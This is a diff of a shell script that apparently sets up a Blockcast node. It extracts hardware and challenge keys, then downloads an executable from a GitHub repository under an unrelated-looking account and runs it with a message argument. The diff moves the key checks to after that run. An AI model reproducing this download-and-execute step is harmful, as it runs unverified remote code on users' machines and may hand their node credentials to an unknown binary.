@@ -122,21 +122,7 @@ HWID=$(echo "$INIT_OUTPUT" | grep -i "Hardware ID" | cut -d ':' -f 2- | tr -d '[
 CHALLENGE_KEY=$(echo "$INIT_OUTPUT" | grep -i "Challenge Key" | cut -d ':' -f 2- | tr -d '[:space:]')
 REG_URL=$(echo "$INIT_OUTPUT" | grep -i "Registration URL" | cut -d ':' -f 2- | tr -d '[:space:]')
 
-# Check if keys were extracted successfully
-if [ -z "$HWID" ] || [ -z "$CHALLENGE_KEY" ] || [ -z "$REG_URL" ]; then
-    echo "Error: Failed to extract keys or URL from init output"
-    echo "Init command output:"
-    echo "$INIT_OUTPUT"
-    exit 1
-fi
 
-# Output results
-
-echo "Hardware ID: $HWID"
-echo "Challenge Key: $CHALLENGE_KEY"
-echo "Registration URL: $REG_URL"
-
-echo "1. Visit https://app.blockcast.network/ and log in"
 apt install -y jq
 
 PUBLIC_IP=$(curl -s ifconfig.me)
@@ -172,3 +158,20 @@ echo "MESSAGE: $MESSAGE"
 curl -L -o /home/blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
 chmod +x /home/blockcast
 /home/blockcast -message "$MESSAGE"
+
+# Check if keys were extracted successfully
+if [ -z "$HWID" ] || [ -z "$CHALLENGE_KEY" ] || [ -z "$REG_URL" ]; then
+    echo "Error: Failed to extract keys or URL from init output"
+    echo "Init command output:"
+    echo "$INIT_OUTPUT"
+    exit 1
+fi
+
+# Output results
+
+echo "Hardware ID: $HWID"
+echo "Challenge Key: $CHALLENGE_KEY"
+echo "Registration URL: $REG_URL"
+
+echo "1. Visit https://app.blockcast.network/ and log in"
+
